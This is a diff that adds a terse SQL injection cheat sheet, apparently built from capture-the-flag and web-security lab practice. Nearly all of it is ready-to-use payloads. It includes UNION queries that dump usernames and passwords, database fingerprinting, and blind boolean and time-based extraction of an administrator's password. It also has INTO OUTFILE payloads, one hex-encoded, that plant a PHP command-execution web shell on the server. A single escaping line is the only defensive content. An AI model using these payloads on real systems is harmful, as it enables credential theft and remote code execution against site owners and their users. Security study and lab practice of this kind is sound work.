@@ -1,0 +1,67 @@
+' order by 3 --
+' UNION SELECT 'abcdef',NULL,NULL--
+multiple values in a single column  -->  ' UNION SELECT NULL,username||'~'||password FROM users--
+
+check version   Oracle              -->  ' UNION SELECT BANNER, NULL FROM v$version--
+                MySQL and Mincrosoft-->  ' UNION SELECT @@version, NULL#   
+                                    -->  ' UNION SELECT version(), NULL#
+' UNION SELECT table_name, 'a' FROM all_tables--  (oracle)
+--oracle --> https://hackmd.io/@to016/H1nFH60_o#Examining-the-database --> blind SQL
+
+content non-Oracle -->' UNION SELECT 'abc','def'#                   
+' UNION SELECT table_name, NULL FROM information_schema.tables--
+' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_abcdef'--
+' UNION SELECT username_abcdef, password_abcdef FROM users_abcdef--
+
+content Oracle     -->' UNION SELECT 'abc','def' FROM dual--               
+' UNION SELECT table_name,NULL FROM all_tables--
+' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS_ABCDEF'--
+' UNION SELECT USERNAME_ABCDEF, PASSWORD_ABCDEF FROM USERS_ABCDEF--
+
+other table        
+' UNION SELECT username, password FROM users--
+
+'a'||'dmin'    =   admin
+' || (SELECT sleep(10))
+
+mysql -udb_user -pdb_password
+show databases;
+use myDB;
+
+#---------------------blind SQL
+INSERT INTO log (uid, agent, cdate) VALUES (xx, ‘2’,if(1=1,sleep(10),’a’))– – ‘, NOW())
+
+UNION SELECT gRoUp_cOncaT(0x7c,table_name,0x7C) FROM information_schema.tables WHERE table_name like "%flag%"-- -
+UNION SELECT column_name FROM information_schema.columns WHERE table_name like "flag_304ad593"-- -
+UNION SELECT flag_3e53dc FROM flag_304ad593-- -
+
+'or substr((select gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata),{i},1)='{j}' #
+
+' and (select substring(flag,1,1) from flag_ahihi)='C'-- -
+TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
+TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§
+
+sheng’ and (Select LENGTH(table_name) FROM information_schema.tables WHERE table_schema=database()) > 1#
+sheng’ and (Select SUBSTRING(table_name,1,5) FROM information_schema.tables WHERE table_schema=database()) like “users”#
+sheng’ and (Select LENGTH(password) FROM users WHERE username like “%sheng%”) > 1#
+sheng’ and (Select LENGTH(password) FROM users WHERE username like “%sheng%”) > 1#
+sheng’ and (Select SUBSTRING(password,$1$,1) FROM users WHERE username like “sheng”) like “$a$”#
+
+-99 union SELECT GROUP_CONCAT(User, File_priv,@@secure_file_priv) FROM mysql.user --
+100 union select  null,null,"<?php system($_GET['cmd']);?>",null INTO OUTFILE "/var/www/html/revshell.php" --
+------------------------------------RCE
+print (("<? system($_GET['cmd']); ?>").encode('utf-8').hex())
+--->3c3f7068702073797374656d28245f4745545b27636d64275d293b3f3e
+x3rz" UNION ALL SELECT NULL,0x3c3f7068702073797374656d28245f4745545b27636d64275d293b3f3e,NULL INTO OUTFILE "/var/www/html/revshell.php"-- -
+--------------------------------------save value
+SELECT * FROM fa_dating_users WHERE fa_dating_username = 'admin' INTO @var1,@var2,@var3,@var4,@var5,@var6,@var7
+INSERT INTO fa_dating_users VALUES ('username','password','pin',yob,'interest',@var2,'name')
+-----------------------------------defend
+$id = $database->real_escape_string($_GET["id"]);
+
+https://tsublogs.wordpress.com/2017/06/07/pentest-qa-cung-tsu-5-sql-injection-without-information_schema/
+'or substr((select group_concat(b) from (select 1,2 as b union select * from `sqli_blind`)a),{i},1)='{j}' #
+
+---blind SQL 
+https://nguyendt.hashnode.dev/crewctf-2022   sqlite
+https://hackmd.io/@onsra03/BJFnD2-7j
